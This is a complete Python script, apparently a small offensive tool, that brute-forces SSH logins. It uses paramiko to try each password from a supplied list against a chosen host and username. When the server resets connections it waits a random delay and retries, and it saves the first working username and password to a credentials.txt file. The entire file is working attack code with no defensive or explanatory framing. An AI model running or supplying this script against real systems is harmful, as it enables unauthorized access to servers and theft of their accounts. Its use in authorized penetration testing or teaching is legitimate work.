import socket
import random
import time
import paramiko
from colorama import init, Fore
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE


def sleep_countdown(t):
    while t:
        print(f"{RED}sleeping for {t} sec {RESET}", end="\r")
        time.sleep(1)
        t -= 1


def is_ssh_open(hostname, port, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname,
            port=port,
            username=username,
            password=password,
            timeout=3)
    except socket.timeout:
        print(f"{RED} [!] Host: {hostname} is unreachable, timed out. {RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}: {password}")
        return False
    except (ConnectionResetError,
                EOFError,
                paramiko.ssh_exception.SSHException):
        print(f"{BLUE} [*] Quota exceeded, retrying with delay...{RESET}")
        sleep_countdown(random.randint(1, 60))
        return is_ssh_open(hostname, port, username, password)
    else:
        print(f"{GREEN} [+] Found combo: \n\t \
            HOSTNAME: {hostname} \n\t \
            USERNAME: {username}\n\t \
            PASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--port",  help="SSH server port.", default=22)
    parser.add_argument("-p", "--passlist", help="File that contain password list in each line.", required=True)
    parser.add_argument("-u", "--user", help="Host username.", required=True)
    args = parser.parse_args()
    host = args.host
    port = args.port
    passlist = args.passlist
    user = args.user
    passlist = open(passlist, encoding="utf-8").read().splitlines()

    for password in passlist:
        if is_ssh_open(host, port, user, password.strip()):
            open("credentials.txt", "w", encoding="utf-8").write(f"{user}@{host}:{password}")
            break
